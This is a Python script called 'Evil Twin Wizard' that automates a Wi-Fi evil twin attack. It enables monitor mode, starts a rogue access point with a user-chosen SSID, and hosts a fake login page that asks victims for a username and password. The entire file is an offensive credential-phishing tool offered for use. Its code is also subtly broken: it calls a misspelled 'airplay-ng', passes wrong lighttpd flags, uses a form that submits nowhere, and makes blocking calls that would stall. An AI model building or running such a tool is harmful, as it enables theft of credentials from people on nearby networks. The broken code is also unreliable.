import subprocess
import os

def list_interfaces():
    interfaces = []
    output = subprocess.check_output(["iw", "dev"])
    for line in output.decode("utf-8").splitlines():
        if "Interface" in line:
            interface = line.split()[1]
            interfaces.append(interface)
    return interfaces

def create_monitor_mode(interface):
    subprocess.check_output(["airmon-ng", "start", interface])

def create_evil_twin(interface, ssid, channel):
    subprocess.check_output(["airbase-ng", "-c", channel, "-e", ssid, interface])

def start_airplay_ng(interface):
    subprocess.check_output(["airplay-ng", "-i", interface])

def host_html(html_code, ssid):
    html_file = f"{ssid}.html"
    with open(html_file, "w") as f:
        f.write(html_code)
    print(f"HTML file saved as {html_file}")
    subprocess.check_output(["lighttpd", "-D", "-f", "/etc/lighttpd/lighttpd.conf", "-m", "/usr/lib/lighttpd", "-i", html_file])

def main():
    print("Evil Twin Wizard")
    print("----------------")

    # Selecionar interface
    print("Select an interface:")
    interfaces = list_interfaces()
    for i, interface in enumerate(interfaces):
        print(f"{i+1}. {interface}")
    choice = input("Enter the number of the interface: ")
    interface = interfaces[int(choice) - 1]
    print(f"You selected: {interface}")

    # Selecionar HTML
    print("\nSelect an HTML template:")
    print("1. Default (simple login page)")
    print("2. Custom (enter HTML code)")
    html_choice = input("Enter the number of the HTML template: ")
    if html_choice == "1":
        html_code = "<html><body><h1>Evil Twin Login</h1><form action=''><input type='text' name='username'><input type='password' name='password'><input type='submit' value='Login'></form></body></html>"
    elif html_choice == "2":
        print("Enter your custom HTML code:")
        html_code = input("> ")

    # Selecionar nome e senha
    print("\nEnter the AP name and password:")
    ssid = input("AP Name: ")
    password = input("AP Password: ")

    # Selecionar canal
    print("\nEnter the channel:")
    channel = input("Channel: ")

    # Criar modo monitor
    create_monitor_mode(interface)

    # Criar Evil Twin
    create_evil_twin(interface, ssid, channel)

    # Hospedar HTML
    host_html(html_code, ssid)

    # Iniciar airplay-ng
    start_airplay_ng(interface)

    print("Evil Twin attack started!")

if __name__ == "__main__":
    main()
